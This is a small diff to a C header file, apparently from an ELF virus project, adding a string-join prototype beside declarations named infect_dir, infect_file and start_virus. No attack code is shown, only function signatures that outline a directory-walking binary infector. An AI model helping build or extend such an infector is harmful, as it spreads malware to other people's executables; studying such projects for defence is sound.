@@ -3,6 +3,7 @@
 
 int8_t		check_elf_header(uint8_t *content, size_t size);
 Elf64_Phdr	*find_phdr(void *file, size_t file_size);
+char		*ft_strjoin(char const *s1, char const *s2);
 Elf64_Phdr	*get_program_header(void *file, uint32_t index);
 void		infect_dir(char *dir_path, uint8_t *start_virus);
 uint8_t		*infect_file(void *file, size_t file_size, void *start_virus);
